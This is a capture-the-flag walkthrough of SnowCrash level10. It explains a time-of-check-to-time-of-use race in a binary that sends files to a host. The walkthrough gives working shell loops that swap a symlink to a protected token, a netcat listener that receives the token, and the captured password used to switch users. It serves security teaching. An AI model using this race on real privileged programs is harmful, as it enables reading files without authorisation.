We start by exploring the files in the directory and find an executable named `level10` and a file named `token`.

```
level10@SnowCrash:~$ ls
level10  token
```

Running `./level10` shows that it expects a file and a host as arguments.

```
level10@SnowCrash:~$ ./level10
./level10 file host
	sends file to host if you have access to it
```

Attempting to directly read `token` returns "Permission denied."

```
level10@SnowCrash:~$ cat token
cat: token: Permission denied
```

Attempting to send `token` to `127.0.0.1` also fails due to lack of access.

```
level10@SnowCrash:~$ ./level10 token 127.0.0.1
You don't have access to token
```

---

## Explanation of TOCTOU (Time of Check to Time of Use)

This vulnerability occurs when a program checks permissions or access rights at one time but uses the resource later, potentially allowing an attacker to change the resource between the check and the use. By changing the resource at the right time, an attacker can bypass permissions.

In this case, the `level10` program checks for access on the symbolic link `/tmp/t2` before reading it. If we change `/tmp/t2` to point to `token` after the check but before the read, we can bypass the restriction.

### Setting Up the Exploit

1. **Setting Up a Listener**:

   - We start `netcat` to listen on port `6969`, where we’ll receive the content of `token`.

   ```
   level10@SnowCrash:~$ nc -lk 6969
   ```

2. **Creating an Initial Temporary File**:

   - We create a dummy file `/tmp/t1` to serve as the initial target for `level10`'s access check.

   ```
   level10@SnowCrash:~$ touch /tmp/t1
   ```

3. **Automating the Symlink Switch**:

   - We create a loop that alternates `/tmp/t2` to point to `/tmp/t1` and `~/token` in rapid succession.

   ```
   level10@SnowCrash:~$ $(while true; do ln -sf /tmp/t1 /tmp/t2; ln -sf ~/token /tmp/t2; done)&
   [1] 8939
   ```

   - Here, `ln -sf` creates symbolic links, and we swap `/tmp/t2` between pointing to `/tmp/t1` (which we have access to) and `token` (which we do not).

4. **Executing `level10` in a Loop**:

   - We run `level10` in a loop, using `/tmp/t2` as the file argument, which occasionally points to `token` during the execution.

   ```
   level10@SnowCrash:~$ $(while true; do ~/level10 /tmp/t2 127.0.0.1; done)&
   [2] 25697
   ```

   - When `level10` checks `/tmp/t2` and finds it pointing to `/tmp/t1`, it proceeds, and if the link switches to `token` at the right moment, it sends `token`'s content to `127.0.0.1`.

5. **Receiving the Flag**:

   - Returning to our `nc` listener, we capture the flag output sent by `level10`:

   ```
   level10@SnowCrash:~$ nc -lk 6969
   .* ( ) *.
   .* ( ) *.
   .* ( ) *.
   woupa2yuojeeaaed06riuj63c
   ```

---

### Final Steps

Using the captured token to switch to the `flag10` user:

```
level10@SnowCrash:~$ su flag10
Password: woupa2yuojeeaaed06riuj63c
Don't forget to launch getflag !
```

After switching users, running `getflag` retrieves the flag:

```
flag10@SnowCrash:~$ getflag
Check flag.Here is your token :
```

This completes the exploit for Level10.
